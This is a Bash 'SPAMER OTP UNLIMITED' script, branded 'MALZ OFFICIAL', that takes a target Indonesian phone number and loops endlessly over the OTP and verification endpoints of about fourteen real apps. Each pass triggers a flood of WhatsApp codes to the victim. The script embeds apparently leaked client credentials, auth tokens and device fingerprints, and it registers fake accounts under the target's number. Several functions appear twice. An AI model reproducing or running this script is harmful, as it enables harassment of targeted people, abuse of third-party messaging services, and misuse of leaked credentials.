#!/bin/bash

# ANSI Color Codes
BLUE='\033[1;94m'       # Biru Terang
GREEN='\033[1;92m'      # Hijau Terang
RED='\033[1;91m'        # Merah Terang
CYAN='\033[1;96m'       # Cyan Terang
YELLOW='\033[1;93m'     # Kuning Terang
MAGENTA='\033[1;95m'    # Magenta Terang
WHITE='\033[1;97m'      # Putih Terang
NC='\033[0m'            # No Color (Reset)

# Function to apply ANSI color codes to text (Simplified)
color() {
  local color_code=$1
  local text=$2

  case "$color_code" in
    red)    printf "${RED}%s${NC}\n" "$text" ;;
    green)  printf "${GREEN}%s${NC}\n" "$text" ;;
    yellow) printf "${YELLOW}%s${NC}\n" "$text" ;;
    blue)   printf "${BLUE}%s${NC}\n" "$text" ;;
    magenta)printf "${MAGENTA}%s${NC}\n" "$text" ;;
    cyan)   printf "${CYAN}%s${NC}\n" "$text" ;;
    white)  printf "${WHITE}%s${NC}\n" "$text" ;;
    *)      printf "%s${NC}\n" "$text" ;; # Default: No color
  esac
}

# Function to generate a random alphanumeric string of specified length
codex() {
  local length=$1
  tr -dc A-Za-z0-9 </dev/urandom | head -c "$length"
}

# Function to extract a value from a string based on start and end delimiters
fetch_value() {
  local response=$1
  local start_string=$2
  local end_string=$3

  local start_index=$(expr index "$response" "$start_string")
  if [ "$start_index" -eq 0 ]; then
    return
  fi

  start_index=$((start_index + ${#start_string}))
  local remaining_string="${response:$start_index}"
  local end_index=$(expr index "$remaining_string" "$end_string")

  if [ "$end_index" -eq 0 ]; then
    return
  fi

  end_index=$((end_index - 1))
  printf "%s\n" "${remaining_string:0:$end_index}"
}

# Function to send an OTP request to Bisatopup
bisatopup() {
  local nomor=$1
  local device_id=$(codex 16)
  local url="https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id=${device_id}&version_name=6.12.04&version=61204"
  local payload="phone_number=$nomor"
  local headers=("Content-Type: application/x-www-form-urlencoded")

  local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" "$url")
  local result=$(fetch_value "$response" '"message":"' '","')

  if [ "$result" == "OTP akan segera dikirim ke perangkat" ]; then
    color red "BISATOPUP: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "BISATOPUP: $response"
    return 1
  fi
}

# Function to send an OTP request to Titipku
titipku() {
  local nomor=$1
  local url="https://titipku.tech/v1/mobile/auth/otp?method=wa"
  local payload="{\"phone_number\": \"+62$nomor\", \"message_placeholder\": \"hehe\"}"
  local headers=("Content-Type: application/json; charset=UTF-8")

  local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" "$url")
  local result=$(fetch_value "$response" '"message":"' '","')

  if [ "$result" == "otp sent" ]; then
    color red "TITIPKU: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "TITIPKU: $response"
    return 1
  fi
}

# Function to send an OTP request to Titipku
titipku() {
  local nomor=$1
  local url="https://titipku.tech/v1/mobile/auth/otp?method=wa"
  local payload="{\"phone_number\": \"+62$nomor\", \"message_placeholder\": \"hehe\"}"
  local headers=("Content-Type: application/json; charset=UTF-8")

  local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" "$url")
  local result=$(fetch_value "$response" '"message":"' '","')

  if [ "$result" == "otp sent" ]; then
    color red "TITIPKU: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "TITIPKU: $response"
    return 1
  fi
}

# Function to send an OTP request to Jogjakita
jogjakita() {
  local nomor=$1
  local url_token="https://aci-user.bmsecure.id/oauth/token"
  local payload_token="grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=501&version_name=6.10.1"
  local headers_token=("Authorization: Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==" "Content-Type: application/x-www-form-urlencoded" "User-Agent: okhttp/4.10.0")

  local response_token=$(curl -s -X POST -d "$payload_token" -H "${headers_token[0]}" -H "${headers_token[1]}" -H "${headers_token[2]}" "$url_token")
  local auth=$(fetch_value "$response_token" '{"access_token":"' '","')

  local url_otp="https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send"
  local payload_otp="{\"phone_user\": \"$nomor\", \"primary_credential\": {\"device_id\": \"\", \"fcm_token\": \"\", \"id_kota\": 0, \"id_user\": 0, \"location\": \"0.0,0.0\", \"uuid\": \"\", \"version_code\": \"501\", \"version_name\": \"6.10.1\", \"via\": \"jogjakita_user\"}, \"uuid\": \"00000000-4c22-250d-3006-9a465f072739\", \"version_code\": \"5.01\", \"version_name\": \"6.10.1\", \"via\": \"jogjakita_user\"}"
  local headers_otp=("Content-Type: application/json; charset=UTF-8" "Authorization: Bearer $auth")

  local response_otp=$(curl -s -X POST -d "$payload_otp" -H "${headers_otp[0]}" -H "${headers_otp[1]}" "$url_otp")
  local result=$(fetch_value "$response_otp" '{"rc":' '","')

  if [ "$result" == "200" ]; then
    color red "JOGJAKITA: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "JOGJAKITA: $response_otp"
    return 1
  fi
}

# Function to send an OTP request to Candireload
candireload() {
  local nomor=$1
  local url="https://app.candireload.com/apps/v8/users/req_otp_register_wa"
  local payload="{\"uuid\": \"b787045b140c631f\", \"phone\": \"$nomor\"}"
  local headers=("Content-Type: application/json" "irsauth: c6738e934fd7ed1db55322e423d81a66")

  local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" -H "${headers[1]}" "$url")
  local result=$(fetch_value "$response" '{"success":' '","')

  if [ "$result" == "true" ]; then
    color red "CANDIRELOAD: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "CANDIRELOAD: $response"
    return 1
  fi
}

# Function to send an OTP request to Speedcash
speedcash() {
  local nomor=$1
  local url_token="https://sofia.bmsecure.id/central-api/oauth/token"
  local payload_token="grant_type=client_credentials"
  local headers_token=("Authorization: Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==" "Content-Type: application/x-www-form-urlencoded")

  local response_token=$(curl -s -X POST -d "$payload_token" -H "${headers_token[0]}" -H "${headers_token[1]}" "$url_token")
  local auth=$(fetch_value "$response_token" 'access_token":"' '","')

  local url_otp="https://sofia.bmsecure.id/central-api/sc-api/otp/generate"
  local uuid=$(codex 8)
  local payload_otp="{\"version_name\": \"6.2.1 (428)\", \"phone\": \"$nomor\", \"appid\": \"SPEEDCASH\", \"version_code\": 428, \"location\": \"0,0\", \"state\": \"REGISTER\", \"type\": \"WA\", \"app_id\": \"SPEEDCASH\", \"uuid\": \"00000000-4c22-250d-ffff-ffff${uuid}\", \"via\": \"BB ANDROID\"}"
  local headers_otp=("Authorization: Bearer $auth" "Content-Type: application/json")

  local response_otp=$(curl -s -X POST -d "$payload_otp" -H "${headers_otp[0]}" -H "${headers_otp[1]}" "$url_otp")
  local result=$(fetch_value "$response_otp" '"rc":"' '","')

  if [ "$result" == "00" ]; then
    color red "SPEEDCASH: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "SPEEDCASH: $response_otp"
    return 1
  fi
}

# Function to send an OTP request to Kerbel
kerbel() {
  local nomor=$1
  local url="https://keranjangbelanja.co.id/api/v1/user/otp"
  local payload="----dio-boundary-0879576676\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n$nomor\r\n----dio-boundary-0879576676\r\ncontent-disposition: form-data; name=\"otp\"\r\n\r\n118872\r\n----dio-boundary-0879576676--"
  local headers=("content-type: multipart/form-data; boundary=--dio-boundary-0879576676")

  local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" "$url")
  local result=$(fetch_value "$response" '"result":"' '","')

  if [ "$result" == "OTP Berhasil Dikirimkan" ]; then
    color red "KERBEL: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "KERBEL: $response"
    return 1
  fi
}

# Function to send an OTP request to Mitradelta
mitradelta() {
  local nomor=$1
  local url="https://irsx.mitradeltapulsa.com:8080/appirsx/appapi.dll/otpreg?phone=$nomor"

  local response=$(curl -s "$url")
  local result=$(fetch_value "$response" '{"success":' '","')

  if [ "$result" == "true" ]; then
    color red "MITRADELTA: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "MITRADELTA: $response"
    return 1
  fi
}

# Function to send an OTP request to Jogjakita
jogjakita() {
  local nomor=$1
  local url_token="https://aci-user.bmsecure.id/oauth/token"
  local payload_token="grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=501&version_name=6.10.1"
  local headers_token=("Authorization: Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==" "Content-Type: application/x-www-form-urlencoded" "User-Agent: okhttp/4.10.0")

  local response_token=$(curl -s -X POST -d "$payload_token" -H "${headers_token[0]}" -H "${headers_token[1]}" -H "${headers_token[2]}" "$url_token")
  local auth=$(fetch_value "$response_token" '{"access_token":"' '","')

  local url_otp="https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send"
  local payload_otp="{\"phone_user\": \"$nomor\", \"primary_credential\": {\"device_id\": \"\", \"fcm_token\": \"\", \"id_kota\": 0, \"id_user\": 0, \"location\": \"0.0,0.0\", \"uuid\": \"\", \"version_code\": \"501\", \"version_name\": \"6.10.1\", \"via\": \"jogjakita_user\"}, \"uuid\": \"00000000-4c22-250d-3006-9a465f072739\", \"version_code\": \"5.01\", \"version_name\": \"6.10.1\", \"via\": \"jogjakita_user\"}"
  local headers_otp=("Content-Type: application/json; charset=UTF-8" "Authorization: Bearer $auth")

  local response_otp=$(curl -s -X POST -d "$payload_otp" -H "${headers_otp[0]}" -H "${headers_otp[1]}" "$url_otp")
  local result=$(fetch_value "$response_otp" '{"rc":' '","')

  if [ "$result" == "200" ]; then
    color red "JOGJAKITA: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "JOGJAKITA: $response_otp"
    return 1
  fi
}

# Function to send an OTP request to Candireload
candireload() {
  local nomor=$1
  local url="https://app.candireload.com/apps/v8/users/req_otp_register_wa"
  local payload="{\"uuid\": \"b787045b140c631f\", \"phone\": \"$nomor\"}"
  local headers=("Content-Type: application/json" "irsauth: c6738e934fd7ed1db55322e423d81a66")

  local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" -H "${headers[1]}" "$url")
  local result=$(fetch_value "$response" '{"success":' '","')

  if [ "$result" == "true" ]; then
    color red "CANDIRELOAD: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "CANDIRELOAD: $response"
    return 1
  fi
}

# Function to send an OTP request to Speedcash
speedcash() {
  local nomor=$1
  local url_token="https://sofia.bmsecure.id/central-api/oauth/token"
  local payload_token="grant_type=client_credentials"
  local headers_token=("Authorization: Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==" "Content-Type: application/x-www-form-urlencoded")

  local response_token=$(curl -s -X POST -d "$payload_token" -H "${headers_token[0]}" -H "${headers_token[1]}" "$url_token")
  local auth=$(fetch_value "$response_token" 'access_token":"' '","')

  local url_otp="https://sofia.bmsecure.id/central-api/sc-api/otp/generate"
  local uuid=$(codex 8)
  local payload_otp="{\"version_name\": \"6.2.1 (428)\", \"phone\": \"$nomor\", \"appid\": \"SPEEDCASH\", \"version_code\": 428, \"location\": \"0,0\", \"state\": \"REGISTER\", \"type\": \"WA\", \"app_id\": \"SPEEDCASH\", \"uuid\": \"00000000-4c22-250d-ffff-ffff${uuid}\", \"via\": \"BB ANDROID\"}"
  local headers_otp=("Authorization: Bearer $auth" "Content-Type: application/json")

  local response_otp=$(curl -s -X POST -d "$payload_otp" -H "${headers_otp[0]}" -H "${headers_otp[1]}" "$url_otp")
  local result=$(fetch_value "$response_otp" '"rc":"' '","')

  if [ "$result" == "00" ]; then
    color red "SPEEDCASH: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "SPEEDCASH: $response_otp"
    return 1
  fi
}

# Function to send an OTP request to Kerbel
kerbel() {
  local nomor=$1
  local url="https://keranjangbelanja.co.id/api/v1/user/otp"
  local payload="----dio-boundary-0879576676\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n$nomor\r\n----dio-boundary-0879576676\r\ncontent-disposition: form-data; name=\"otp\"\r\n\r\n118872\r\n----dio-boundary-0879576676--"
  local headers=("content-type: multipart/form-data; boundary=--dio-boundary-0879576676")

  local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" "$url")
  local result=$(fetch_value "$response" '"result":"' '","')

  if [ "$result" == "OTP Berhasil Dikirimkan" ]; then
    color red "KERBEL: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "KERBEL: $response"
    return 1
  fi
}

# Function to send an OTP request to Mitradelta
mitradelta() {
  local nomor=$1
  local url="https://irsx.mitradeltapulsa.com:8080/appirsx/appapi.dll/otpreg?phone=$nomor"

  local response=$(curl -s "$url")
  local result=$(fetch_value "$response" '{"success":' '","')

  if [ "$result" == "true" ]; then
    color red "MITRADELTA: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "MITRADELTA: $response"
    return 1
  fi
}

# Function to send an OTP request to Agenpayment
agenpayment() {
  local nomor=$1
  local url_register="https://agenpayment-app.findig.id/api/v1/user/register"
  local payload_register="{\"name\": \"AAD\", \"phone\": \"$nomor\", \"email\": \"${nomor}@gmail.com\", \"pin\": \"1111\", \"id_propinsi\": \"5e5005024d44ff5409347111\", \"id_kabupaten\": \"5e614009360fed7c1263fdf6\", \"id_kecamatan\": \"5e614059360fed7c12653764\", \"alamat\": \"aceh\", \"nama_toko\": \"QUARD\", \"alamat_toko\": \"aceh\"}"
  local headers_register=("content-type: application/json; charset=utf-8" "merchantcode: 63d22a4041d6a5bc8bfdb3be")

  local response_register=$(curl -s -X POST -d "$payload_register" -H "${headers_register[0]}" -H "${headers_register[1]}" "$url_register")
  local result_register=$(fetch_value "$response_register" '{"status":' '","')

  if [ "$result_register" == "200" ]; then
    : # Registration successful, continue to login
  else
    color yellow "AGENPAYMENT Registration Failed: $response_register"
    return 1
  fi

  local url_login="https://agenpayment-app.findig.id/api/v1/user/login"
  local payload_login="{\"phone\": \"$nomor\", \"pin\": \"1111\"}"
  local headers_login=("content-type: application/json; charset=utf-8" "merchantcode: 63d22a4041d6a5bc8bfdb3be")

  local response_login=$(curl -s -X POST -d "$payload_login" -H "${headers_login[0]}" -H "${headers_login[1]}" "$url_login")
  local auth=$(fetch_value "$response_login" 'validate_id":"' '",')

  local url_otp="https://agenpayment-app.findig.id/api/v1/user/login/send-otp"
  local payload_otp="{\"codeLength\": 4, \"validate_id\": \"$auth\", \"type\": \"whatsapp\"}"
  local headers_otp=("content-type: application/json; charset=utf-8" "merchantcode: 63d22a4041d6a5bc8bfdb3be")

  local response_otp=$(curl -s -X POST -d "$payload_otp" -H "${headers_otp[0]}" -H "${headers_otp[1]}" "$url_otp")
  local result_otp=$(fetch_value "$response_otp" '{"status":' '","')

  if [ "$result_otp" == "200" ]; then
    color red "AGENPAYMENT: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "AGENPAYMENT OTP Failed: $response_otp"
    return 1
  fi
}

# Function to send an OTP request to Z4reload
z4reload() {
  local nomor=$1
  local url="https://api.irmastore.id/apps/otp/v2/sendotpwa"
  local payload="{\"hp\": \"$nomor\", \"uuid\": \"MyT2H1xFo2WHoMT5gjdo3W9woys1\", \"app_code\": \"z4reload\"}"
  local headers=("content-type: application/json" "authorization: 7117c8f459a98282c2c576b519d0662f")

  local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" -H "${headers[1]}" "$url")
  local result=$(fetch_value "$response" '{"success":' '","')

  if [ "$result" == "true" ]; then
    color red "Z4RELOAD: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "Z4RELOAD: $response"
    return 1
  fi
}

# Function to send an OTP request to Singa
singa() {
  local nomor=$1
  local url="https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id="
  local payload="{\"mobile_phone\": \"$nomor\", \"type\": \"mobile\", \"is_switchable\": 1}"
  local headers=("Content-Type: application/json; charset=utf-8")

  local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" "$url")
  local result=$(fetch_value "$response" '"msg":"' '","')

  if [ "$result" == "Success" ]; then
    color red "SINGA: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "SINGA: $response"
    return 1
  fi
}

# Function to send an OTP request to KTAKILAT
ktakilat() {
  local nomor=$1
  local url="https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode"
  local payload="{\"mobileNo\": \"$nomor\", \"smsType\": 1}"
  local headers=("Content-Type: application/json; charset=UTF-8" "Device-Info: eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0=")

  local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" -H "${headers[1]}" "$url")
  local result=$(fetch_value "$response" '"msg":"' '","')

  if [ "$result" == "success" ]; then
    color red "KTAKILAT: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "KTAKILAT: $response"
    return 1
  fi
}

# Function to send an OTP request to UANGME
uangme() {
  local nomor=$1
  local aid="gaid_15497a9b-2669-42cf-ad10-$(codex 12)"
  local url="https://api.uangme.com/api/v2/sms_code?phone=$nomor&scene_type=login&send_type=wp"
  local headers=(
    "aid: $aid"
    "android_id: b787045b140c631f"
    "app_version: 300504"
    "brand: samsung"
    "carrier: 00"
    "Content-Type: application/x-www-form-urlencoded"
    "country: 510"
    "dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0"
    "fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo"
    "gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0"
    "lan: in_ID"
    "model: SM-G965N"
    "ns: wifi"
    "os: 1"
    "timestamp: 1732178536"
    "tz: Asia%2FBangkok"
    "User-Agent: okhttp/3.12.1"
    "v: 1"
    "version: 28"
  )

  local response=$(curl -s -H "${headers[0]}" -H "${headers[1]}" -H "${headers[2]}" -H "${headers[3]}" -H "${headers[4]}" -H "${headers[5]}" -H "${headers[6]}" -H "${headers[7]}" -H "${headers[8]}" -H "${headers[9]}" -H "${headers[10]}" -H "${headers[11]}" -H "${headers[12]}" -H "${headers[13]}" -H "${headers[14]}" -H "${headers[15]}" -H "${headers[16]}" "$url")
  local result=$(fetch_value "$response" '{"code":"' '","')

  if [ "$result" == "200" ]; then
    color red "UANGME: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "UANGME: $response"
    return 1
  fi
}

# Function to send an OTP request to CAIRIN
cairin() {
  local nomor=$1
  local uuid=$(codex 32)
  local url="https://app.cairin.id/v2/app/sms/sendWhatAPPOPT"
  local payload="appVersion=3.0.4&phone=$nomor&userImei=$uuid"
  local headers=("Content-Type: application/x-www-form-urlencoded")

  local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" "$url")

  if [ "$response" == '{"code":"0"}' ]; then
    color red "CAIRIN: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "CAIRIN: $response"
    return 1
  fi
}

# Function to send an OTP request to ADIRAKU
adiraku() {
  local nomor=$1
  local url="https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
  local payload="{\"mobileNumber\": \"$nomor\", \"type\": \"prospect-create\", \"channel\": \"whatsapp\"}"
  local headers=("Content-Type: application/json; charset=utf-8")

  local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" "$url")
  local result=$(fetch_value "$response" '{"message":"' '","')

  if [ "$result" == "success" ]; then
    color red "ADIRAKU: Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "ADIRAKU: $response"
    return 1
  fi
}

# Main function to spam the given WhatsApp number
spam_whatsapp() {
  local nomor=$1

  bisatopup "$nomor"
  titipku "$nomor"
  jogjakita "$nomor"
  candireload "$nomor"
  speedcash "$nomor"
  kerbel "$nomor"
  mitradelta "$nomor"
  agenpayment "$nomor"
  z4reload "$nomor"
  singa "$nomor"
  ktakilat "$nomor"
  uangme "$nomor"
  cairin "$nomor"
  adiraku "$nomor"
}

# Function to print colored text (Simplified)
kasi_warna_green() {
  printf "${GREEN}%s${NC}\n" "$1"
}

# Clear the screen
clear

# Banner
echo '                                                                                                                                                       '
echo '                 HELLO MY NAME IS MALZ! ';
      kasi_warna_green '                    .xH888888Hx. ';
      kasi_warna_green '                   .H8888888888888: ';
      kasi_warna_green '                   888*"\"\"?\""*888';
      kasi_warna_green "                         d8x.   ^%88k ";
      kasi_warna_green "                        <88888X   '?8 ";
      kasi_warna_green '                   `:..:`888888>    8> ';
      kasi_warna_green '                          `"*88     X ';
      kasi_warna_green '                     .xHHhx.."      ! ';
      kasi_warna_green '                    X88888888hx. ..! ';
      kasi_warna_green '                       "*888888888" ';
      kasi_warna_green '                          ^"***"` ';
      echo -e "${YELLOW}                    [ ${GREEN}D${RED}a${BLUE}n${YELLOW}x${RED}y${GREEN}O${RED}f${BLUE}f${YELLOW}i${RED}c${BLUE}i${GREEN}a${RED}l${YELLOW} ]${RED}" | lolcat
      echo -e "${BLUE}                     TikTok:${RED}@Malzjomok${NC}" | lolcat
echo -e "${RED}     ──────────────────────────────────────────────────${NC}" | lolcat
echo -e "${WHITE}     ──────────────────────────────────────────────────${NC}"
    echo -e "${RED}
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │ ░██████╗██████╗░░█████╗░███╗░░░███╗███████╗██████╗  │
  │ ██╔════╝██╔══██╗██╔══██╗████╗░████║██╔════╝██╔══██╗ │
  │ ╚█████╗░██████╔╝███████║██╔████╔██║█████╗░░██████╔╝ │
  ${WHITE}│ ░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║██╔══╝░░██╔══██╗ │
  │ ██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║███████╗██║░░██║ │
  │ ╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚═╝ │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
  │                 ${BG_RED}${YELLOW}SPAMER OTP UNLIMITED${NC}                │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
echo -e "${RED}
        ╭────────────────────────────────────────╮
        │           ${CYAN}SPAM OTP UNLIMITED${RED}           │
        ╰────────────────────────────────────────╯
    ${NC}"

# Main loop
while true; do
 echo -e "${WHITE}DEVELOPER: MALZ OFFICIAL ✓${GREEN}"
  read -p "MASUKAN NOMOR TARGET (62XX): " nomor

  if [[ ! "$nomor" =~ ^62[0-9]+$ ]]; then
    color yellow "Nomor harus dimulai dengan 62 dan hanya berisi angka."
    continue
  fi

  while true; do
    spam_whatsapp "$nomor"
    sleep 2  # Jeda 2 detik antara setiap putaran
  done
done
